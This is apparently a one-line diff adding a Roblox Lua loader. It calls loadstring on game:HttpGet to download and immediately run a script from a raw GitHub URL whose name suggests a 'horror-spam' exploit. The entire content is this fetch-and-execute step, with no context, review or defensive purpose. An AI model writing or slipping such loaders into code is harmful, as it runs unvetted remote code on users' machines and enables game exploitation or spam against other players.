@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/pinkie-promise-horror-spam3-kl3hy0bzol9rdj.lua"))()
